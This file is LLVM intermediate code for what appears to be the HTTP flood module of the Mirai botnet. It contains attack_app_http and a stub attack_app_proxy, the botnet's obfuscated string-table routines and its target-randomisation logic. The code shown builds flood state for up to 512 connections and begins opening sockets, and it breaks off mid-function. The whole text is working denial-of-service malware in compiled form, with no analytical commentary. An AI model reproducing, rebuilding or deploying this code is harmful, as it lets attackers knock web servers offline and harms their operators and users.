; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.table_value = type { i8*, i16 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_cfnull_state = type { i32, i8, i32, i32, i32, [512 x i8], [129 x i8], i32 }

@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"POST /cdn-cgi/\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"0\0D\0A\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table_key = dso_local global i32 1043935, align 4
@table = dso_local global [63 x %struct.table_value] zeroinitializer, align 16
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_app_proxy(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_app_http(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca %struct.fd_set*, align 8
  %30 = alloca i32, align 4
  %31 = alloca %struct.fd_set*, align 8
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 20, i8* noundef null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 noundef zeroext %67, %struct.attack_option* noundef %68, i8 noundef zeroext 19, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 noundef zeroext %70, %struct.attack_option* noundef %71, i8 noundef zeroext 8, i8* noundef null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 noundef zeroext %73, %struct.attack_option* noundef %74, i8 noundef zeroext 21, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 23, i32 noundef 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 noundef zeroext %79, %struct.attack_option* noundef %80, i8 noundef zeroext 7, i32 noundef 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %83, i8 0, i64 10241, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

86:                                               ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

89:                                               ; preds = %86, %4
  br label %2457

90:                                               ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* noundef %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

94:                                               ; preds = %90
  br label %2457

95:                                               ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* noundef %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

99:                                               ; preds = %95
  br label %2457

100:                                              ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* noundef %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

104:                                              ; preds = %100
  br label %2457

105:                                              ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

106:                                              ; preds = %137, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* noundef %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %140

111:                                              ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %136

119:                                              ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %136

127:                                              ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = sub nsw i32 %133, 32
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* %131, align 1
  br label %136

136:                                              ; preds = %127, %119, %111
  br label %137

137:                                              ; preds = %136
  %138 = load i32, i32* %10, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %10, align 4
  br label %106, !llvm.loop !6

140:                                              ; preds = %106
  %141 = load i32, i32* %18, align 4
  %142 = icmp sgt i32 %141, 512
  br i1 %142, label %143, label %144

143:                                              ; preds = %140
  store i32 512, i32* %18, align 4
  br label %144

144:                                              ; preds = %143, %140
  call void @table_unlock_val(i8 noundef zeroext 43)
  call void @table_unlock_val(i8 noundef zeroext 44)
  call void @table_unlock_val(i8 noundef zeroext 45)
  call void @table_unlock_val(i8 noundef zeroext 46)
  call void @table_unlock_val(i8 noundef zeroext 47)
  call void @table_unlock_val(i8 noundef zeroext 48)
  call void @table_unlock_val(i8 noundef zeroext 49)
  call void @table_unlock_val(i8 noundef zeroext 50)
  call void @table_unlock_val(i8 noundef zeroext 51)
  call void @table_unlock_val(i8 noundef zeroext 52)
  call void @table_unlock_val(i8 noundef zeroext 53)
  %145 = load i32, i32* %18, align 4
  %146 = sext i32 %145 to i64
  %147 = call noalias i8* @calloc(i64 noundef %146, i64 noundef 3140) #6
  %148 = bitcast i8* %147 to %struct.attack_http_state*
  store %struct.attack_http_state* %148, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %149

149:                                              ; preds = %346, %144
  %150 = load i32, i32* %9, align 4
  %151 = load i32, i32* %18, align 4
  %152 = icmp slt i32 %150, %151
  br i1 %152, label %153, label %349

153:                                              ; preds = %149
  %154 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %157, i32 0, i32 1
  store i8 0, i8* %158, align 4
  %159 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %159, i64 %161
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %162, i32 0, i32 0
  store i32 -1, i32* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = load i8, i8* %5, align 1
  %167 = zext i8 %166 to i32
  %168 = srem i32 %165, %167
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %176, i32 0, i32 4
  store i32 %172, i32* %177, align 4
  %178 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %181, i32 0, i32 6
  %183 = getelementptr inbounds [257 x i8], [257 x i8]* %182, i64 0, i64 0
  %184 = load i8*, i8** %17, align 8
  %185 = call i32 @util_strcpy(i8* noundef %183, i8* noundef %184)
  %186 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %189, i32 0, i32 6
  %191 = getelementptr inbounds [257 x i8], [257 x i8]* %190, i64 0, i64 0
  %192 = load i8, i8* %191, align 4
  %193 = sext i8 %192 to i32
  %194 = icmp ne i32 %193, 47
  br i1 %194, label %195, label %223

195:                                              ; preds = %153
  %196 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %199, i32 0, i32 6
  %201 = getelementptr inbounds [257 x i8], [257 x i8]* %200, i64 0, i64 0
  %202 = getelementptr inbounds i8, i8* %201, i64 1
  %203 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %206, i32 0, i32 6
  %208 = getelementptr inbounds [257 x i8], [257 x i8]* %207, i64 0, i64 0
  %209 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %212, i32 0, i32 6
  %214 = getelementptr inbounds [257 x i8], [257 x i8]* %213, i64 0, i64 0
  %215 = call i32 @util_strlen(i8* noundef %214)
  %216 = sext i32 %215 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 1 %202, i8* align 4 %208, i64 %216, i1 false)
  %217 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %218 = load i32, i32* %9, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %220, i32 0, i32 6
  %222 = getelementptr inbounds [257 x i8], [257 x i8]* %221, i64 0, i64 0
  store i8 47, i8* %222, align 4
  br label %223

223:                                              ; preds = %195, %153
  %224 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %225 = load i32, i32* %9, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %224, i64 %226
  %228 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %227, i32 0, i32 10
  %229 = getelementptr inbounds [9 x i8], [9 x i8]* %228, i64 0, i64 0
  %230 = load i8*, i8** %15, align 8
  %231 = call i32 @util_strcpy(i8* noundef %229, i8* noundef %230)
  %232 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %233 = load i32, i32* %9, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %235, i32 0, i32 9
  %237 = getelementptr inbounds [9 x i8], [9 x i8]* %236, i64 0, i64 0
  %238 = load i8*, i8** %15, align 8
  %239 = call i32 @util_strcpy(i8* noundef %237, i8* noundef %238)
  %240 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %243, i32 0, i32 7
  %245 = getelementptr inbounds [129 x i8], [129 x i8]* %244, i64 0, i64 0
  %246 = load i8*, i8** %16, align 8
  %247 = call i32 @util_strcpy(i8* noundef %245, i8* noundef %246)
  %248 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %249 = load i32, i32* %9, align 4
  %250 = load i8, i8* %5, align 1
  %251 = zext i8 %250 to i32
  %252 = srem i32 %249, %251
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i64 %253
  %255 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i32 0, i32 2
  %256 = load i8, i8* %255, align 4
  %257 = zext i8 %256 to i32
  %258 = icmp slt i32 %257, 32
  br i1 %258, label %259, label %289

259:                                              ; preds = %223
  %260 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %261 = load i32, i32* %9, align 4
  %262 = load i8, i8* %5, align 1
  %263 = zext i8 %262 to i32
  %264 = srem i32 %261, %263
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i64 %265
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i32 0, i32 1
  %268 = load i32, i32* %267, align 4
  %269 = call i32 @ntohl(i32 noundef %268) #7
  %270 = call i32 @rand_next()
  %271 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %272 = load i32, i32* %9, align 4
  %273 = load i8, i8* %5, align 1
  %274 = zext i8 %273 to i32
  %275 = srem i32 %272, %274
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i64 %276
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i32 0, i32 2
  %279 = load i8, i8* %278, align 4
  %280 = zext i8 %279 to i32
  %281 = lshr i32 %270, %280
  %282 = add i32 %269, %281
  %283 = call i32 @htonl(i32 noundef %282) #7
  %284 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %287, i32 0, i32 4
  store i32 %283, i32* %288, align 4
  br label %289

289:                                              ; preds = %259, %223
  %290 = call i32 @rand_next()
  %291 = urem i32 %290, 5
  switch i32 %291, label %337 [
    i32 0, label %292
    i32 1, label %301
    i32 2, label %310
    i32 3, label %319
    i32 4, label %328
  ]

292:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 54)
  %293 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i32 0, i32 5
  %298 = getelementptr inbounds [512 x i8], [512 x i8]* %297, i64 0, i64 0
  %299 = call i8* @table_retrieve_val(i32 noundef 54, i32* noundef null)
  %300 = call i32 @util_strcpy(i8* noundef %298, i8* noundef %299)
  call void @table_lock_val(i8 noundef zeroext 54)
  br label %337

301:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 55)
  %302 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %305, i32 0, i32 5
  %307 = getelementptr inbounds [512 x i8], [512 x i8]* %306, i64 0, i64 0
  %308 = call i8* @table_retrieve_val(i32 noundef 55, i32* noundef null)
  %309 = call i32 @util_strcpy(i8* noundef %307, i8* noundef %308)
  call void @table_lock_val(i8 noundef zeroext 55)
  br label %337

310:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 56)
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 5
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %315, i64 0, i64 0
  %317 = call i8* @table_retrieve_val(i32 noundef 56, i32* noundef null)
  %318 = call i32 @util_strcpy(i8* noundef %316, i8* noundef %317)
  call void @table_lock_val(i8 noundef zeroext 56)
  br label %337

319:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 57)
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 5
  %325 = getelementptr inbounds [512 x i8], [512 x i8]* %324, i64 0, i64 0
  %326 = call i8* @table_retrieve_val(i32 noundef 57, i32* noundef null)
  %327 = call i32 @util_strcpy(i8* noundef %325, i8* noundef %326)
  call void @table_lock_val(i8 noundef zeroext 57)
  br label %337

328:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 58)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 5
  %334 = getelementptr inbounds [512 x i8], [512 x i8]* %333, i64 0, i64 0
  %335 = call i8* @table_retrieve_val(i32 noundef 58, i32* noundef null)
  %336 = call i32 @util_strcpy(i8* noundef %334, i8* noundef %335)
  call void @table_lock_val(i8 noundef zeroext 58)
  br label %337

337:                                              ; preds = %328, %319, %310, %301, %292, %289
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 6
  %343 = getelementptr inbounds [257 x i8], [257 x i8]* %342, i64 0, i64 0
  %344 = load i8*, i8** %17, align 8
  %345 = call i32 @util_strcpy(i8* noundef %343, i8* noundef %344)
  br label %346

346:                                              ; preds = %337
  %347 = load i32, i32* %9, align 4
  %348 = add nsw i32 %347, 1
  store i32 %348, i32* %9, align 4
  br label %149, !llvm.loop !8

349:                                              ; preds = %149
  br label %350

350:                                              ; preds = %2456, %972, %962, %349
  store i32 0, i32* %23, align 4
  %351 = call i64 @time(i64* noundef null) #6
  %352 = trunc i64 %351 to i32
  store i32 %352, i32* %27, align 4
  br label %353

353:                                              ; preds = %350
  store %struct.fd_set* %21, %struct.fd_set** %29, align 8
  store i32 0, i32* %28, align 4
  br label %354

354:                                              ; preds = %364, %353
  %355 = load i32, i32* %28, align 4
  %356 = zext i32 %355 to i64
  %357 = icmp ult i64 %356, 16
  br i1 %357, label %358, label %367

358:                                              ; preds = %354
  %359 = load %struct.fd_set*, %struct.fd_set** %29, align 8
  %360 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %359, i32 0, i32 0
  %361 = load i32, i32* %28, align 4
  %362 = zext i32 %361 to i64
  %363 = getelementptr inbounds [16 x i64], [16 x i64]* %360, i64 0, i64 %362
  store i64 0, i64* %363, align 8
  br label %364

364:                                              ; preds = %358
  %365 = load i32, i32* %28, align 4
  %366 = add i32 %365, 1
  store i32 %366, i32* %28, align 4
  br label %354, !llvm.loop !9

367:                                              ; preds = %354
  br label %368

368:                                              ; preds = %367
  br label %369

369:                                              ; preds = %368
  store %struct.fd_set* %22, %struct.fd_set** %31, align 8
  store i32 0, i32* %30, align 4
  br label %370

370:                                              ; preds = %380, %369
  %371 = load i32, i32* %30, align 4
  %372 = zext i32 %371 to i64
  %373 = icmp ult i64 %372, 16
  br i1 %373, label %374, label %383

374:                                              ; preds = %370
  %375 = load %struct.fd_set*, %struct.fd_set** %31, align 8
  %376 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %375, i32 0, i32 0
  %377 = load i32, i32* %30, align 4
  %378 = zext i32 %377 to i64
  %379 = getelementptr inbounds [16 x i64], [16 x i64]* %376, i64 0, i64 %378
  store i64 0, i64* %379, align 8
  br label %380

380:                                              ; preds = %374
  %381 = load i32, i32* %30, align 4
  %382 = add i32 %381, 1
  store i32 %382, i32* %30, align 4
  br label %370, !llvm.loop !10

383:                                              ; preds = %370
  br label %384

384:                                              ; preds = %383
  store i32 0, i32* %9, align 4
  br label %385

385:                                              ; preds = %956, %384
  %386 = load i32, i32* %9, align 4
  %387 = load i32, i32* %18, align 4
  %388 = icmp slt i32 %386, %387
  br i1 %388, label %389, label %959

389:                                              ; preds = %385
  %390 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %391 = load i32, i32* %9, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %390, i64 %392
  store %struct.attack_http_state* %393, %struct.attack_http_state** %26, align 8
  %394 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %394, i32 0, i32 1
  %396 = load i8, i8* %395, align 4
  %397 = zext i8 %396 to i32
  %398 = icmp eq i32 %397, 1
  br i1 %398, label %399, label %411

399:                                              ; preds = %389
  %400 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %401 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %400, i32 0, i32 12
  %402 = load i32, i32* %401, align 4
  %403 = icmp ne i32 %402, 0
  br i1 %403, label %404, label %407

404:                                              ; preds = %399
  %405 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %406 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %405, i32 0, i32 1
  store i8 4, i8* %406, align 4
  br label %410

407:                                              ; preds = %399
  %408 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %409 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %408, i32 0, i32 1
  store i8 0, i8* %409, align 4
  br label %410

410:                                              ; preds = %407, %404
  br label %411

411:                                              ; preds = %410, %389
  %412 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %412, i32 0, i32 1
  %414 = load i8, i8* %413, align 4
  %415 = zext i8 %414 to i32
  %416 = icmp eq i32 %415, 0
  br i1 %416, label %417, label %497

417:                                              ; preds = %411
  %418 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %418, i8 0, i64 16, i1 false)
  %419 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %420 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %419, i32 0, i32 0
  %421 = load i32, i32* %420, align 4
  %422 = icmp ne i32 %421, -1
  br i1 %422, label %423, label %428

423:                                              ; preds = %417
  %424 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %425 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 4
  %427 = call i32 @close(i32 noundef %426)
  br label %428

428:                                              ; preds = %423, %417
  %429 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #6
  %430 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %430, i32 0, i32 0
  store i32 %429, i32* %431, align 4
  %432 = icmp eq i32 %429, -1
  br i1 %432, label %433, label %434

433:                                              ; preds = %428
  br label %956

434:                                              ; preds = %428
  %435 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 4
  %438 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
